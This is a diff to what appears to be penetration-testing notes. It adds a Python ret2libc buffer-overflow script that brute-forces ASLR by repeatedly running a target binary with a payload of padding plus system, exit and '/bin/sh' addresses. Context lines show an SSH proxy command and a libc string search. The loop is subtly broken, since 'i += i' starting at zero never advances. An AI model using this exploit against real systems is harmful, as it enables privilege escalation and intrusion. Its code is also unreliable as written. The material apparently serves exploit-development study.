@@ -54,3 +54,31 @@ ssh -D localhost:9999 <ip> -p 25
 
 ### Identify /bin/sh location
 - `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`
+
+### Brute Force ASLR Example
+
+```python
+from subprocess import call
+import struct
+
+libc_base_addr = <address>
+
+system_off = <address>
+exit_off = <address>
+arg_off = <address>
+
+system_addr = struct.pack("<I",libc_base_addr+system_off)
+exit_addr = struct.pack("<I",libc_base_addr+exit_off)
+arg_addr = struct.pack("<I",libc_base_addr+arg_off)
+
+bof = "A" * 112
+bof += system_addr
+bof += exit_addr
+bof += arg_addr
+
+i = 0
+while (i <512):
+  print "Try: %s" %i
+  i += i
+  ret = call(["/path/to/binary", bof])
+```
